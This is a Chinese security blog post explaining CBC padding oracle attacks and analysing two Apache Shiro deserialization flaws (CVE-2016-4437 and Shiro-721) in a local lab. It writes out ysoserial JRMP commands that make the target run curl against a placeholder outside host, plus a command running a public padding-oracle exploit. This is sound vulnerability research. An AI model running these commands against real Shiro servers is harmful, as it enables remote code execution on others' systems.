
# Shiro Padding Oracle Attack 反序列化


                                阅读量   
                                **721382**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/200793/t018f7a02dc97571f9d.png)](./img/200793/t018f7a02dc97571f9d.png)



## 基础

参考[ctfwiki中对CBC模式的介绍](https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/cbc-zh/)，先看一下CBC模式下的加解密模式图：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01431b8985e5e5d358.jpg)

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0121e555dc8b2098be.jpg)

简单概括一下，加密过程初始化向量IV和第一组明文进行异或，然后经过加密算法得到第一组密文，并拿它作为下一分组加密的IV向量，迭代下去。解密过程反之，先解密再和IV向量异或得到明文plaintext。这里的IV参数是一个随机值(长度和分组长度等长)，为了保证多次加密相同数据生成的密文不同而设计的。

为了方便后文描述，将IV和Planttext异或后的值称为中间intermediary Value。

**分组的填充padding**<br>
分组的长度，不同加密算法的长度如下图所示：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f2257dbc513ac685.jpg)

分组密码(block cipher)需要保证总长度是分组长度的整数倍，但一般在最后一组会出现长度不够分组长度的情况，这时候就需要使用padding填充，填充的规则是在最后填充一个固定的值，值的大小为填充的字节总数，即需最后还差2个字节，则填充两个0x02。下边8个字节的填充范围为`0x01-0x08`。

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01f680a6992f1913b9.jpg)

> 这种Padding原则遵循的是常见的PKCS#5标准。[http://www.di-mgt.com.au/cryptopad.html#PKCS5](http://www.di-mgt.com.au/cryptopad.html#PKCS5)

### <a class="reference-link" name="Padding%20Oracle%20Attack"></a>Padding Oracle Attack

#### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"></a>利用条件
1. 攻击者知道密文和初始向量IV
1. padding错误和padding正确服务器可返回不一样的状态
**攻击效果**<br>
正常CBC解密需要知道IV、Key、密文，而通过Padding Oracle漏洞，只用知道IV、密文即可获得明文。

#### <a class="reference-link" name="demo"></a>demo

以这样一个程序为例：

```
http://sampleapp/home.jsp?UID=0000000000000000EFC2807233F9D7C097116BB33E813C5E
```

前16个字母(8字节)`0000000000000000`为IV，后32字母(16字节)为密文：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01a927f7ca1b78d382.jpg)

**padding 0x01**<br>
通常程序校验padding是否正确是通过检查末尾的那个字节的值，我们可以通过修改IV的值使得其与中间量intermediary Value异或得到的结果(plaintext)最后一个字节(填充位)为0x01。

实现这样一个穷举的过程，需要改变IV的最后一个字节(最多255次)，且需要服务端将判断padding校验的结果返回给客户端(类似于布尔注入的逻辑)。比如在web应用中，padding正确(解密的内容不正确)返回200，padding错误(解密内容错误)返回500。

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t012288b5717a7fdbe0.jpg)

至此通过上述步骤，我们可以通过`IV`(fuzz出的IV)和`0x01`异或得到intermediary Value中间值。

在**单个分组**的情况下，其实我们拿着intermediary Value和**初始向量IV**异或，即可拿到最后明文的最后一个字节：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_411_/t0199ae31ccf215ff70.jpg)

**padding 0x02**<br>
此时，通过修改IV第八个字节的值使得最后一个padding位变成0x02(上图中0x67^0x02=0×64)，再fuzz IV第七个字节，使得服务端解出plaintext其填充位为0x02，以此类推。

总的来说，其实攻击的本质都是为了得到中间临时变量intermediary value，通过其和初始IV计算出明文。

**多分组密文情况**<br>
上面说到的Padding Oracle Attack是以单个分组进行的，如果密文有多个分组，其最大的区别在于这一分组加密的初始IV向量为上次组加密的结果Ciphertext。

在多分组密文中，由于密文和IV已知且可控，先拿第一组padding的方式爆破IV推算intermediary value，然后根据原始IV计算出明文，也可以通过修改原始IV控制密文结果；再拿第一二组，用padding的方式爆破intermediary value，此时的初始IV为第一组的密文，以此类推。

#### <a class="reference-link" name="%E9%98%B2%E5%BE%A1"></a>防御

漏洞的关键点在于攻击者能够判断其padding的结果，在使用CBC模式的分组加密算法需要注意这一点，比如让服务端加上异常处理等等。

> 实验代码：[Demo](media/15832217572390/Demo.py)

### <a class="reference-link" name="CBC%E5%AD%97%E8%8A%82%E5%8F%8D%E8%BD%AC"></a>CBC字节反转

在乌云知识库里有一篇文章的例子说的比较清晰：[CBC字节翻转攻击-101Approach](http://drops.xmd5.com/static/drops/tips-7828.html)，<br>
再来参考[ctfwiki中对CBC模式的介绍](https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/cbc-zh/)：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_572_/t01602e5f8d8c4cbafd.jpg)

简单来说，通过构造第n的密文块为`C(n) xor P(n+1) xor A`，使得第n+1密文块为A(个人觉得CTFWiki这里写错了)，为什么呢？

`C(n) xor P(n+1)`的结果实际上就是第n+1组的`intermediary value`，在解密时让`intermediary value`自己异或自己得全0，然后再异或A得A。如下图所示：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e998cae09f444661.jpg)

简而言之，通过损坏密文字节来改变明文字节，攻击条件为知道一组明文和密文。



## CVE-2016-4437: Shiro 反序列化(Shiro &lt;= 1.2.4)

Apache Shiro是一个开源安全框架，提供身份验证、授权、密码学和会话管理。在Apache Shiro &lt;= 1.2.4版本中存在反序列化漏洞。

### <a class="reference-link" name="%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"></a>环境搭建

去github上下一个[shiro 1.2.4](https://github.com/apache/shiro/archive/shiro-root-1.2.4.zip):

```
git clone https://github.com/apache/shiro.git
cd shiro
git checkout shiro-root-1.2.4
```

然后修改shiro/samples/web/pom.xml

```
&lt;!--  需要设置编译的版本 --&gt;  
    &lt;properties&gt;
       &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt;
       &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt;
   &lt;/properties&gt;

   &lt;dependencies&gt;
       &lt;dependency&gt;
           &lt;groupId&gt;javax.servlet&lt;/groupId&gt;
           &lt;artifactId&gt;jstl&lt;/artifactId&gt;
           &lt;!--  这里需要将jstl设置为1.2 --&gt;
           &lt;version&gt;1.2&lt;/version&gt; 
           &lt;scope&gt;runtime&lt;/scope&gt;
       &lt;/dependency&gt;

    ·   &lt;!--加一个gadget--&gt;
       &lt;dependency&gt;
           &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
           &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
           &lt;version&gt;4.0&lt;/version&gt;
       &lt;/dependency&gt;
&lt;dependencies&gt;
```

编译：`sudo mvn package`

爆了这样的错：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_209_/t01eac31805e2b732c2.jpg)

先得去搞个jdk1.6来，mac下弃用了，参考这篇文章：[https://blog.csdn.net/q258523454/article/details/84029886，去这里下[mac的jdk1.6][6]。](https://blog.csdn.net/q258523454/article/details/84029886%EF%BC%8C%E5%8E%BB%E8%BF%99%E9%87%8C%E4%B8%8B%5Bmac%E7%9A%84jdk1.6%5D%5B6%5D%E3%80%82)

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_218_/t01fc10eaa2047f886f.jpg)

然后切换到root创一个文件：/var/root/.m2/toolchains.xml

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;toolchains xmlns="http://maven.apache.org/TOOLCHAINS/1.1.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/TOOLCHAINS/1.1.0 http://maven.apache.org/xsd/toolchains-1.1.0.xsd"&gt;
&lt;!--插入下面代码--&gt;
  &lt;toolchain&gt;
    &lt;type&gt;jdk&lt;/type&gt;
    &lt;provides&gt;
      &lt;version&gt;1.6&lt;/version&gt;
      &lt;vendor&gt;sun&lt;/vendor&gt;
    &lt;/provides&gt;
    &lt;configuration&gt;
        &lt;!--这里是你安装jdk的文件目录--&gt;
      &lt;jdkHome&gt;/Library/Java/JavaVirtualMachines/1.6.0.jdk/&lt;/jdkHome&gt;
    &lt;/configuration&gt;
  &lt;/toolchain&gt;
&lt;/toolchains&gt;
```

再编译就能成功了：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013e8b9cd5e45e4bf9.jpg)

将这个war包放到tomcat的webapp目录下，然后访问`http://127.0.0.1:8080/shiro/`会自动解压：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_341_/t0102489e83d23a4a25.jpg)

也可以把它导到idea里打包，接着配置idea，这里踩了坑EDU版本是没有tomcat server的，一定要用旗舰版：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_725_/t01d860c9ddd4a470dc.jpg)

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_646_/t01f1459d0e56b8af25.jpg)

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_647_/t01bbf04179f45410f5.jpg)

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"></a>漏洞复现

EXP打ysoserial的二链：[shiro1.2.4RCE](media/15832217572390/shiro1.2.4RCE.py)

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_387_/t019f080534a2437b11.jpg)

### <a class="reference-link" name="%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"></a>代码分析

#### <a class="reference-link" name="%E5%8A%A0%E5%AF%86"></a>加密

先下个断点：org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin，去login.jsp登录root secret，选中Remember Me。

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_689_/t01c4ccbe72544253c1.jpg)

在`forgetIdentity`函数中处理了request和response请求，在response中处理remember me的cookie。

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_93_/t01ce379911ea9cc370.jpg)

再跟进`rememberIdentity`函数：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_109_/t018e2b78b0bf67ac98.jpg)

调用`convertPrincipalsToBytes`将账户信息传入，先是进行序列化，再来一个加密：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_299_/t01a707c7b984ca16c1.jpg)

跟进`encrypt`函数：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_180_/t0152b62416dc613a1d.jpg)

`getCipherService`先获取了一下加密服务的配置信息，包括加密模式，填充方式，加密类型等等：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_680_/t01d10666d84567e7d2.jpg)

`cipherService.encrypt`

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_243_/t015c33a7f81d588e58.jpg)

其中秘钥在AbstractRememberMeManager.java中设置的一个定值：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_70_/t0188a9b187d4642ecb.jpg)

通过构造方法设置的：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_166_/t019121ab264ffc61c2.jpg)

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_301_/t01991b219f6ce41b51.jpg)

在加密过程中需要关注的一个点，将iv向量放置在密文头部：org/apache/shiro/crypto/JcaCipherService.java

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_566_/t0177b4cd55249cfd14.jpg)

加密完成后，返回结果传入`rememberSerializedIdentity`函数，处理http请求，返回cookie到response中：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_439_/t01e4c8065a0b93eeee.jpg)

到这里cookie加密处理就结束了，再来跟一下是如何解密cookie的。

#### <a class="reference-link" name="%E8%A7%A3%E5%AF%86"></a>解密

org/apache/shiro/mgt/AbstractRememberMeManager.java#getRememberedPrincipals

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_405_/t0188e5ab46520bd0ad.jpg)

先从`getRememberedSerializedIdentity`函数获取cookie，base64解码：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_489_/t01bb559f5a493ab702.jpg)

然后进入`convertBytesToPrincipals`函数，先是解密，接着反序列化

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_183_/t01a9da238553b8acdc.jpg)

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_96_/t01a477dbf9b5491489.jpg)

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_470_/t0183fa874f4aed33e9.jpg)

### <a class="reference-link" name="%E5%9D%91%E7%82%B9%EF%BC%9A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%99%90%E5%88%B6"></a>坑点：反序列化限制

网上大部分文章都是拿common-collections2这调链来复现，畅通无阻。

我们来试试其他链，把gadget换成ysoserial5打shiro自带的`commons-collections-3.2.1`，会抛出这样一个错误：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_619_/t01f50d2fc5aa97e209.jpg)

再把其组件拉出来单独试试：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_463_/t0192c4506108cd4d84.jpg)

调试分析一下：org/apache/shiro/io/DefaultSerializer.java

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_440_/t0115f8c1aeec2ec5ca.jpg)

跟进`ClassResolvingObjectInputStream`类：org/apache/shiro/io/ClassResolvingObjectInputStream.java

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_524_/t01ea92045e7121345b.jpg)

他继承了`ObjectInputStream`类，重写了`resolveClass`方法，再来看一下原版`resolveClass`方法：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_409_/t0147934790d90e763a.jpg)

`Class.forName`和`ClassUtils.forName`的差别，来看看`ClassUtils`具体实现：org/apache/shiro/util/ClassUtils.java#forName

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_431_/t01af5493fd812f4d21.jpg)

shiro不是像原版那样通过`java.lang.Class`反射获取class，而是通过`ParallelWebappClassLoader`去加载class

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_463_/t0192c4506108cd4d84.jpg)

查了一些下资料，看到[orange师傅文章](http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html)评论中说不支持装载数组类型，这里没细跟原因了。

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_145_/t010fa2825c72e22e34.jpg)

#### <a class="reference-link" name="JRMP%E7%BB%95%E8%BF%87"></a>JRMP绕过

[Orang师傅在文章](http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html)中一顿操作，发现JRMP可以避开上述限制，测试一下：

server：

```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 'curl http://x.x.x.x:8989'
```

client:

```
java -jar ysoserial.jar JRMPClient 'x.x.x.x:12345'
```

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_182_/t01a3e22b52781026ff.jpg)

稍微调了一下EXP,大概能行的原因就是走的远程的class加载的，而不是像之前那样直接打本地：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_620_/t01764428eede918794.jpg)

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_614_/t01b061535adaf57b27.jpg)

不过有一点比较困惑，用URLDNS打了没结果，但是直接用5链JRMP打却可以…



## Shiro Padding Oracle攻击（Shiro &lt;= 1.4.1）

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"></a>漏洞复现

EXP用[3ndz/Shiro-721](https://github.com/3ndz/Shiro-721)，shiro的版本1.4.1配置过程参考上文。

yso生成个jrmpclient：

```
java -jar ysoserial.jar JRMPClient 'x.x.x.x:12345' &gt; JRMPClient
```

服务端起一个jrmplistener

```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections2 'curl http://x.x.x.x:8989'
```

```
python2 shiro_padding_oracle.py http://127.0.0.1:8088/samples_web_war_exploded/index.jsp [rememberMe的cookie] JRMPClien
```

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_368_/t0147845acd97e2cb72.jpg)

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

先来看看这个版本对秘钥的处理：org/apache/shiro/mgt/AbstractRememberMeManager.java

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_141_/t018c0d1b693daf6135.jpg)

一直跟进，可以看到将之前的硬编码秘钥换成了动态生成：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_655_/t0104f400d3bfafa608.jpg)

#### <a class="reference-link" name="padding%E9%94%99%E8%AF%AF"></a>padding错误

在我们给rememberMe输入错误的padding后，经过上文提到的解密过程后，会抛出异常:/org/apache/shiro/crypto/JcaCipherService.class

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_637_/t0110860760d3dac361.jpg)

然后在org/apache/shiro/mgt/AbstractRememberMeManager.java#getRememberedPrincipals捕获

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_466_/t013bdf6334703a47e7.jpg)

最后在org/apache/shiro/web/servlet/SimpleCookie.java中给返回包设置一个rememberMe的cookie，覆盖掉之前的值：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_452_/t0152e1bd8144fc1646.jpg)

调用栈：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_462_/t01412e258d631de31c.jpg)

#### <a class="reference-link" name="padding%E6%AD%A3%E7%A1%AE%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%94%99%E8%AF%AF"></a>padding正确，反序列化错误

在之前的padding oracle漏洞中，依靠控制前一块密文来伪造后一块的明文，根据Padding的机制，可构造出一个bool条件，从而逐位得到明文，然后逐块得到所有明文。

也就是说通过padding获取来伪造明文的，会改变前一块的密文，也就是会影响到解密的结果。我们来看shiro中对于解密结果的处理，在DefaultSerializer.class中进行反序列化时，会失败而抛出异常：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_647_/t012a4f2c6e9a34b3a1.jpg)

而对于客户端而言，结果是一样的，都走到了AbstractRememberMeManager.java的异常处理：

[![](./img/200793/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_600_/t0166c8559641d8137e.jpg)

接着就是给客户端重置rememberMe的cookie。

#### <a class="reference-link" name="%E6%8B%BC%E6%8E%A5%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE"></a>拼接序列化数据

在[gyyy:浅析Java序列化和反序列化](https://xz.aliyun.com/t/3847)这篇文章中介绍了java序列化和反序列化的机制，关键点在于ObjectOutputStream是一个Stream，他会按格式以队列方式读下去，后面拼接无关内容，不会影响反序列化。

所以现在BOOL条件就出来了，拼接无关数据，padding 正确，能正常反序列化，padding错误抛出异常。

最后payload的构造就是不断的用两个block去padding得到intermediary之后，构造密文使得解密后得到指定明文，最后拼接到原有的cookie上。

exp: [https://github.com/3ndz/Shiro-721](https://github.com/3ndz/Shiro-721)

参考文章：
- [分析调试apache shiro反序列化漏洞(CVE-2016-4437)](https://saucer-man.com/information_security/396.html)
- [【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞](https://paper.seebug.org/shiro-rememberme-1-2-4/)
- [pwn-ctf-platform-with-java-jrmp-gadget](http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html)
- [Exploiting JVM deserialization vulns despite a broken class loader](https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html)
- [Shiro 721 Padding Oracle攻击漏洞分析](https://www.anquanke.com/post/id/193165)
- [p0:Shiro Padding Oracle Attack 反序列化](https://p0sec.net/index.php/archives/126/)
[1]: [https://www.freebuf.com/articles/web/15504.html](https://www.freebuf.com/articles/web/15504.html)<br>
[2]: [https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/cbc-zh/](https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/cbc-zh/)<br>
[3]: [https://saucer-man.com/information_security/396.html](https://saucer-man.com/information_security/396.html)<br>
[4]: [https://github.com/apache/shiro/archive/shiro-root-1.2.4.zip](https://github.com/apache/shiro/archive/shiro-root-1.2.4.zip)<br>
[5]: [http://drops.xmd5.com/static/drops/tips-7828.html](http://drops.xmd5.com/static/drops/tips-7828.html)<br>
[6]: [https://support.apple.com/kb/DL1572?locale=zh_CN](https://support.apple.com/kb/DL1572?locale=zh_CN)<br>
[7]: [https://paper.seebug.org/shiro-rememberme-1-2-4/](https://paper.seebug.org/shiro-rememberme-1-2-4/)<br>
[8]: [http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html](http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html)<br>
[9]: [https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html](https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html)<br>
[10]: [https://github.com/threedr3am/marshalsec](https://github.com/threedr3am/marshalsec)<br>
[11]: [https://www.anquanke.com/post/id/193165](https://www.anquanke.com/post/id/193165)<br>
[12]: [https://github.com/3ndz/Shiro-721](https://github.com/3ndz/Shiro-721)<br>
[13]: [https://p0sec.net/index.php/archives/126/](https://p0sec.net/index.php/archives/126/)<br>
[14]: [https://xz.aliyun.com/t/3847](https://xz.aliyun.com/t/3847)
